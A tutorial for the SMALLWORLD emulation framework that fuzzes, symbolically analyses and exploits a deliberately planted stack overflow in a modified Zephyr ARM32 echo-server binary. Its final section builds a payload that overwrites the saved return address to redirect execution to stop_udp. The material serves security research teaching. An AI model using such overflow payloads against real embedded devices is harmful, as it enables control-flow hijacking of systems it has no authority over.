# RTOS Demo
In this demonstration, SMALLWORLD is used to harness vulnerable code in an ARM32 RTOS binary for fuzzing, dynamic analysis, and exploit development. Scripts for each completed stage of the process are included for reference (`rtos_0_run.py`, `rtos_1_fuzz.py`, `rtos_2_analyze.py`, `rtos_3_find_lr.py`, `rtos_4_exploit.py`). The binary under analysis (`zephyr.elf`) is also included.

## Setup
First, verify that SMALLWORLD is installed in your development environment. SMALLWORLD can be installed with the [`install.sh`](https://github.com/smallworld-re/smallworld/blob/main/install.sh) script at the root of this repo or by building a container based on the [`Dockerfile`](https://github.com/smallworld-re/smallworld/blob/main/Dockerfile). For more information, see the [README](https://github.com/smallworld-re/smallworld/blob/main/README.md).

Once this is done, verify that everything is installed properly using the commands below.

```sh
python -c "import smallworld"
python -c "import unicornafl"
python -c "import claripy"
```

Next, we will need a binary to harness. For this example, we use [Zephyr](https://www.zephyrproject.org/), an open source RTOS targeting embedded devices. We will be using a modified version of their [echo server example](https://github.com/zephyrproject-rtos/zephyr/tree/main/samples/net/sockets/echo_server) with some injected vulnerable code for the sake of demonstration.

Using the `zephyr.elf` binary included with this tutorial is recommended. However, if you wish to compile it from scratch, you may do so using `rtos_build.sh`. This bash script uses Docker to pull down the Zephyr SDK, patch the example source code, and compile our `zephyr.elf` binary. Note that the Zephyr SDK is a large project, and may take upwards of an hour to fully install. Additionally, if you compile your own binary, hard-coded addresses in the provided sample scripts may be offset.

## Harnessing
*The `rtos_0_run.py` script is included for reference with this section.*

To start, we must establish some boilerplate to configure logging and hinting. We can also import types to enable type hinting in our script.

```python
import logging

import smallworld
from smallworld.state.cpus.arm import ARM
from smallworld.state.memory.stack.arm import ARM32Stack

# Logging/hinting
smallworld.logging.setup_logging(level=logging.INFO)
smallworld.hinting.setup_hinting(stream=True, verbose=True)
log = logging.getLogger("smallworld")
```

### State Machine & Emulator
The first step in configuring our harness is establishing an execution environment. We can create a `Machine`, add our `Executable`, add a `CPU` for our `Executable`'s platform, and add an `Emulator` to execute our configuration. For this example, we'll use the [Unicorn emulator](https://www.unicorn-engine.org/),  which is included with SMALLWORLD.

```python
# Machine
machine = smallworld.state.Machine()

# Code
zephyr_elf = open("./zephyr.elf", "rb")
code = smallworld.state.memory.code.Executable.from_elf(zephyr_elf, page_size=1)
machine.add(code)

# CPU
cpu: ARM = smallworld.state.cpus.CPU.for_platform(code.platform)
machine.add(cpu)

# Emulator
emulator = smallworld.emulators.UnicornEmulator(code.platform)
```

We will use smallworld to harness the aptly named `smallworld_bug` function in `zephyr.elf`. We can find the address of this function by using the `get_symbol_value` method of our `code` object. Then, we can set our entry point for execution by setting the `pc` register to this symbol's address.

We'll also need to set an exit point for our emulator. For now, let's stop right before the `smallworld_bug` function returns. This address can be found through manual reverse engineering.

```python
# Entry point / exit point
entry_point = code.get_symbol_value("smallworld_bug")
exit_point  = 0x102368 # End of smallworld_bug, found via reverse engineering
cpu.pc.set(entry_point)
emulator.add_exit_point(exit_point)
```

### Memory & Program State
Since our code is being run out of context, it may expect to have access to memory or state which has not been allocated or initialized. We can configure our harness to account for missing state.

For instance, our code will expect to have a stack. We can create a stack for our harness and set our CPU's stack pointer register (`sp`) to point to it. The following snippet adds a stack which will grow downwards from `0x6000` towards `0x2000`. For convenience, we add the type hint `ARM32Stack`.

```python
# Stack
stack: ARM32Stack = smallworld.state.memory.stack.Stack.for_platform(
	cpu.platform, 0x2000, 0x4000
)
machine.add(stack)
sp = stack.get_pointer()
cpu.sp.set(sp)
```

We also need to consider the arguments being passed to our `smallworld_bug` function. We can discover the signature for this function through reverse engineering, revealing that `smallworld_bug` takes an `input` and `output` buffer as arguments.

```c
void smallworld_bug(char* input, char* output);
```

However, in practice, whenever `smallworld_bug` is called, `input` and `output` always point to the same buffer; we only need to allocate one buffer of memory. We can use the following statements to allocate a 16-byte buffer at address `0x1000` and pass this address to `smallworld_bug` by setting the `r0` and `r1` registers.

```python
# Input buffer
buffer_memory_address = 0x1000
input_bytes = b"abcdefghijklmnop"
buffer_memory = smallworld.state.memory.Memory(buffer_memory_address, len(input_bytes))
buffer_memory[0] = smallworld.state.BytesValue(input_bytes, "input_buffer")
machine.add(buffer_memory)

# Pass buffer to smallworld_bug
cpu.r0.set(buffer_memory_address)
cpu.r1.set(buffer_memory_address)
```

### Execution
We can test that our harness configuration works as expected by executing it. There are multiple ways to do this, but calling `machine.step(emulator)` is ideal for fine-grained debugging as it logs each instruction as it is executed.

We also want to inspect the output of our execution. We can extract the buffer's memory region from our emulator and print the result.

```python
# Execute
for step in machine.step(emulator):
	pass

# Extract changes to buffer
buffer_memory.extract(emulator)
output_bytes = buffer_memory.to_bytes(byteorder=code.platform.byteorder)
print(f"Buffer: {output_bytes!r}")
```

Running our harness against `input_bytes` yields the same string of characters capitalized. This confirms that the harness was successful for this input, and gives insight into the behavior of the function being analyzed.

```
emulation complete; encountered exit point or went out of bounds
Buffer: b'ABCDEFGHIJKLMNOP'
```

## Fuzzing
*The `rtos_1_fuzz.py` script is included for reference with this section.*

With our harness configured, we can finally start fuzzing for potential vulnerabilities. Thankfully, SMALLWORLD makes fuzzing with Unicorn and AFL very simple. We can replace our execution step from the snippet above with `machine.fuzz` as shown below. The accompanying `input_callback` is used to configure the machine's state prior to execution using the mutated input from AFL. In our case, it writes to the input buffer. This input receives `uc`, a reference to our emulator, which can be used to modify state and type hinted as `Uc`.

```python
from unicorn.unicorn import Uc

...

# Fuzz
def input_callback(uc: Uc, input, persistent_round, data):
	if len(input) > 0x1000: return False
	uc.mem_write(buffer_memory_address, input)
machine.fuzz(emulator, input_callback)
```

Next, we need to create an input for AFL to start mutating. Create a "fuzz_inputs" directory and put any data into a file inside.

```sh
mkdir fuzz_inputs
echo "aaaaaaaaaaaaaaaa" > fuzz_inputs/input1
```

Now we're ready to start fuzzing. We can begin our fuzzing campaign using the command below. Feel free to modify CLI options to best fit your use case.

```sh
afl-fuzz -t 10000 -U -m none -i fuzz_inputs -o out -- python3 rtos_1_fuzz.py @@
```

### Results
After a 2 hours of fuzzing, my sample campaign's 777k executions yielded 1469 total crashes, deduplicated to 2 unique crashes. The reported crashing inputs are listed below, with some bytes substituted with hex representations.

```
8x88888\xE18\x17\xF3\x1Faaa
\x7F8888888=.3a
```

## Dynamic Crash Analysis
*The `rtos_2_analyze.py` script is included for reference with this section.*

Now that we've discovered 2 unique crashing inputs, we can begin investigating their causes. To do this, we can use [angr](https://angr.io/), a symbolic execution engine which is included in SMALLWORLD. By configuring our input buffer as a labelled concrete value, we can observe how it affects our output state, allowing us to draw informed inferences about the code's behavior.

### Setting up angr
SMALLWORLD makes switching between emulators a simple task. We can start by replacing `UnicornEmulator` with `AngrEmulator` in our harness. Then, we can enable linear mode for angr so that our emulator halts when it encounters a divergence in the symbolic execution path.

```python
# Emulator
emulator = smallworld.emulators.AngrEmulator(code.platform)
emulator.enable_linear()
```

Next, we can modify our creation of the `input_buffer` to ensure it is labelled. The label will help us track where this buffer appears in our output state. We can also modify the contents of the buffer to match one of our crashing inputs.

```python
# Input buffer
buffer_memory_address = 0x1000
input_bytes = b"8x88888\xE18\x17\xF3\x1Faaa"
buffer_memory = smallworld.state.memory.Memory(buffer_memory_address, len(input_bytes))
buffer_memory[0] = smallworld.state.BytesValue(input_bytes, "input_buffer")
machine.add(buffer_memory)
```

Lastly, while executing our harness by stepping through each instruction will work, we can get our results quicker by calling `machine.emulate(emulator)` to let the emulator run until it hits a crash or exit point.

```python
machine.emulate(emulator)
```

### Investigating Crash with Symbolic Execution
Executing this harness will log the instruction disassembly for each block as it is executed and end when it encounters a path divergence. Afterwards, it will log which state objects contain symbolic expressions for us to review.

```
[+] Stepping through 0x102314:	ldrb	r8, [r6, r4]
[!] Path diverged!  Detailes stored in simulation manager.
[!] Register r5 contains a symbolic expression
[!] Register r2 contains a symbolic expression
[!] Register r0 contains a symbolic expression
[!] Register r8 contains a symbolic expression
[!] Register r1 contains a symbolic expression
[!] Memory at 0x1000 (15 bytes) is symbolic
[!] Memory at 0xfff48 (1114296 bytes) is symbolic
[!] Memory at 0x2000 (16384 bytes) is symbolic
```

From this, we can see that the instruction `ldrb r8, [r6, r4]` caused our program to crash. We can investigate the state of each of these registers to understand what went wrong. We can do this by extracting the CPU state from our emulator.

```python
# Investigate crashing instruction
cpu.extract(emulator)
r6 = cpu.r6.get()
print(f"r6: {hex(r6)}")
r4 = cpu.r4.get()
print(f"r4: {hex(r4)}")
r8 = cpu.r8.get()
print(f"r8: {r8}")
```

The contents of these registers as shown below give us insight into the behavior of the code. We can see that the instruction attempted to load memory from `0x1000` with an added offset of `0xf`. This is immediately past the end of our `input_buffer` memory. Additionally, `r8` is a bitvector containing the top byte of our `input_buffer`.

```
r6: 0x1000
r4: 0xf
r8: <BV32 0#24 .. input_buffer[7:0]>
```

This implies that our `input_buffer` may be iterated over byte-by-byte, with `r6 <- &input_buffer`, `r4 <- i`, and `r8 <- input_buffer[i]`. With `r4` being greater than the length of the buffer, our crash may have been caused by improper bounds checking.

### Investigating Symbolic Memory
Our symbolic execution also revealed that memory at `0x2000` is symbolic. This is our stack address; our input buffer has impacted the contents of the stack. We can print the symbolic memory of our stack to determine how it has been impacted by our input.

```python  
# Investigate symbolic stack memory
stack_memory = emulator.read_memory_symbolic(0x2000, 0x4000)
print(f"Symbolic stack memory: {stack_memory}")
```

The resulting bitvector shows most of the stack being uninitialized, with the top 40 bytes containing repeating slices of `input_buffer`.

```
Symbolic stack memory: <BV131072 mem_2000_15_32768 .. mem_3000_16_32768 .. mem_4000_17_32768 .. mem_5000_18_32448 .. input_buffer[111:104] .. input_buffer[111:104] .. input_buffer[111:104] .. input_buffer[111:104] .. input_buffer[111:104] .. input_buffer[111:104] .. input_buffer[111:104] .. input_buffer[111:104] .. input_buffer[95:88] .. input_buffer[95:88] .. input_buffer[95:88] .. input_buffer[95:88] .. input_buffer[95:88] .. input_buffer[95:88] .. input_buffer[95:88] .. input_buffer[95:88] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40]>
```

Interestingly, this memory region contains every other byte of `input_buffer`, starting with the second byte, repeated 8 times. This pattern is cut off early by the top of the stack. Since our presumed iterator variable, `r4`, reached past the end of our input, it is worth investigating if memory was written to past the top of the stack. We can read this memory region as a symbolic expression the same way we read the stack.

```python
# Investigate memory above stack
stack_memory = emulator.read_memory_symbolic(0x6000, 0x1000)
print(f"After stack memory: {stack_memory}")
```

This region of memory contains the remaining 5 bytes of `input_buffer`, though the repeating pattern from before does not hold.

```
After stack memory: <BV32768 input_buffer[39:0] .. mem_6005_19_32728>
```

It is worth noting that each byte that is repeated 8 times in the stack is preceded in `input_buffer` by the character `'8'`. The bytes past the end of the stack, which do not repeat, are not preceded by an `'8'`. Perhaps the code contains a special condition for this character? Let's try the other crashing input and see if it gives any more insight.

```python
input_bytes = b"\x7F8888888=.3a"
```

This crash occurs for a similar reason; a failed attempt to read past the end of `input_buffer`. In this case, the buffer is `0xd` bytes long instead of `0x10`.

```
Symbolic stack memory: <BV131072 mem_2000_14_32768 .. mem_3000_15_32768 .. mem_4000_16_32768 .. mem_5000_17_32448 .. input_buffer[95:88] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[79:72] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[63:56] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[47:40] .. input_buffer[31:24] .. input_buffer[31:24] .. input_buffer[31:24] .. input_buffer[31:24] .. input_buffer[31:24] .. input_buffer[31:24] .. input_buffer[31:24] .. input_buffer[31:16] .. input_buffer[7:0] .. input_buffer[7:0] .. input_buffer[7:0] .. Reverse(reg_40_0_32[31:8])>
After stack memory: <BV32768 mem_6000_19_32768>
```

Similarly to our first case, bytes preceded with `'8'` are repeated 8 times. However, we can also see that the top byte of `input_buffer`, which was preceded by `'3'`, is repeated 3 times. This suggests the code may hold this behavior for numeric characters.

## Exploit Development
*The `rtos_3_find_lr.py` and `rtos_4_exploit.py` scripts are included for reference with this section.*

Now that we have an understanding of the vulnerability present in the binary, SMALLWORLD can become a powerful tool for rapid exploit development.

### Find Return Address in Stack
As we observed in the previous section, certain inputs will overflow the end of the `input_buffer` and allow for arbitrary writes to the stack memory. This means we can overwrite the function's return address to gain control of the program. For this demonstration, our goal will be to reach the `stop_udp` function.

Let's start by pinpointing where exactly in our stack the `lr` register gets written to. This register holds the original return address for our function, is pushed to the stack, and then is popped from the stack to `pc` when the function returns. We can use angr to determine which bits of the stack are tainted by the `lr` register.

Firstly, we should change our input such that it won't overflow the buffer. Let's use the non-crashing input buffer from our original harness.

```python
input_bytes = b"abcdefghijklmnop"
```

Then, we must label our input register `lr` so that we can determine where it appears in the stack, just as we did before with our input buffer.

```python
cpu.lr.set_label("lr")
```

Finally, we can remove any unneeded debugging information that we were printing before, leaving just the symbolic stack memory. When we execute this analysis, we see that the resulting bitvector is full of logic in this case, giving some insight into the complexity of the code under analysis. More importantly, we can pinpoint exactly where `lr` ended up — the top 32 bits of the stack.

```
...
(if ((if (0#24 .. input_buffer[7:0]) - 0x61 >= 0x19 then 0x1 else 0x0) & ~(0#31 .. (if input_buffer[7:0] == 122 then 1 else 0))) != 0x1 then (if ((if (0#24 .. input_buffer[7:0]) - 0x61 >= 0x19 then 0x1 else 0x0) & ~(0#31 .. (if input_buffer[7:0] == 122 then 1 else 0))) != 0x1 then (0#24 .. input_buffer[7:0]) - 0x20 else (0#24 .. input_buffer[7:0]))[7:0] else input_buffer[7:0]) .. Reverse(reg_18_5_32) .. Reverse(reg_1c_4_32) .. Reverse(reg_20_3_32) .. Reverse(reg_24_2_32) .. Reverse(reg_28_1_32) .. Reverse(lr)>
```

### Constructing a Payload
Knowing that `lr` takes up the top 4 bytes of the stack and that `input_buffer` starts 40 bytes below the top of the stack, we can determine that our payload must include 36 bytes of padding followed by our desired 4-byte return address.

To compress 36 bytes into the first 12 bytes of `input_buffer`, we can take advantage of the expanding behavior discovered during dynamic analysis. The 8-byte expression `b"8a8b8c8d"` will expand to 32 bytes when processed. The remaining 4 bytes of padding can be any non-numeric character. Afterwards, we can include the address of `stop_udp`, which should be marked as our exit point.

```python
# Entry point / exit point
entry_point = code.get_symbol_value("smallworld_bug")
stop_udp_addr = code.get_symbol_value("stop_udp")
exit_point = stop_udp_addr
cpu.pc.set(entry_point)
emulator.add_exit_point(exit_point)

...

# Input buffer
buffer_memory_address = 0x1000
input_bytes = b"8a8b8c8d\0\0\0\0" + stop_udp_addr.to_bytes(
    4, code.platform.byteorder.value
)
buffer_memory = smallworld.state.memory.RawMemory.from_bytes(
    input_bytes, buffer_memory_address
)
```

Additionally, we can confirm that our harness reaches `stop_udp` by checking the value of `pc` after executing our harness.

```python
# Reached stop_udp?
cpu.pc.extract(emulator)
print(f"PC: {hex(cpu.pc.get())}")
print(f"Reached stop_udp: {cpu.pc.get() == stop_udp_addr}")
```

Lastly, we should return to using the Unicorn emulator, since we only need concrete execution.

```python
# Emulator
emulator = smallworld.emulators.UnicornEmulator(code.platform)
```

Executing this harness results in control flow successfully being passed to `stop_udp`!

```
PC: 0x1027c4
Reached stop_udp: True
```

## Conclusion
SMALLWORLD provides a uniquely detailed level of control over emulated execution environments, making it an ideal choice for harnessing, fuzzing, and analyzing specific areas of interest within binaries for nearly any platform. In this tutorial, we demonstrated these capabilities against an ARM32 RTOS binary by discovering, investigating, and exploiting a vulnerable function with no need for hardware in the loop.
